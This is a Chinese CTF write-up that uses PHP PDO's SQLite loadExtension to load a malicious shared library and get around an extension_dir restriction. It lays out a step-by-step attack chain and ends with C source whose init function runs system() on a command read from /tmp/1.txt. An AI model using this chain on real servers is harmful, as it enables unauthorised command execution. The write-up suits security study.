无curl命令(sqlite3扩展)

刚刚说过原题是有复仇题的，很明显就是讲curl命令相关的去掉了，也就是一开始截图显示的情况。那我们现在怎么打呢，其实打了前面的curl扩展之后应该有差不多的思路，就是要找类似的扩展，去打加载恶意so。

首先先介绍一下sqlite3扩展加载so文件的机制。

  • SQLite3 扩展 允许用户加载外部共享库（.so / .dll）来注册自定义函数、聚合器、虚拟表等。
  • PHP 提供了两种方式加载扩展：
    1. SQLite3::loadExtension(string $shared_library) —— 面向过程风格
    2. PDO::SQLite::loadExtension(string $shared_library) —— PDO 风格

但是这么明显有可能存在漏洞的地方，不可能不做一点限制的，下面就是一些限制机制。

  • PHP 配置项：sqlite3.extension_dir（仅对 SQLite3 类有效）
  • SQLite 编译选项：SQLITE_ENABLE_LOAD_EXTENSION（必须开启） 如果配置项被设置了不可写路径，并且SQLite编译也没打开，那基本上是不可能可以利用的，我们这里回到原题的话可以知道 sqlite3.extension_dir为空，那就说明我们无法用sqlite3类进行加载，被限制麻了。但是我们刚刚是有两个东西的，还有一个PDO可以使用，并且很明显他不受这个的限制。

原因：

2

很明显，sqlite3.extension_dir是php对这个so加载的一个限制，所以隶属于php的sqlite3类(class)要遵守这个规则。
但是PDO不一样，他并不是经过php的，而是C语言的，他会直接去调用sqlite引擎，所以php的限制对它没有用，它会直接执行sqlite3_load_extension()

知道这个之后我们就可以写C语言攻击链路了。还有一些特殊的规则这里就不多说了，攻击链路如下：

步骤 操作 说明
1 编写恶意 SQLite 扩展 .so 在扩展初始化时执行系统命令
2 将 .so 上传到可写路径 绕过 extension_dir 限制
3 使用 PDO('sqlite::memory:') 创建内存数据库 无需文件，避免权限问题
4 调用 $pdo->sqliteCreateFunction() 或直接 loadExtension('绝对路径') 加载扩展
5 扩展自动执行 sqlite3_extension_init() 中的恶意代码 实现命令执行

__declspec(dllexport)

int sqlite3_exploit_init(
    sqlite3 *db,
    char **pzErrMsg,
    const sqlite3_api_routines *pApi
) {
    SQLITE_EXTENSION_INIT2(pApi);

    const char *command_file_path = "/tmp/1.txt";
    char command_buffer[512] = {0};
    FILE *file_handle;

    file_handle = fopen(command_file_path, "r");
    if (file_handle == NULL) {
        return SQLITE_OK;
    }

    if (fgets(command_buffer, sizeof(command_buffer), file_handle) != NULL) {
        command_buffer[strcspn(command_buffer, "\r\n")] = 0;
        if (strlen(command_buffer) > 0) {
            system(command_buffer);
        }
    }
    fclose(file_handle);
    return SQLITE_OK;
}
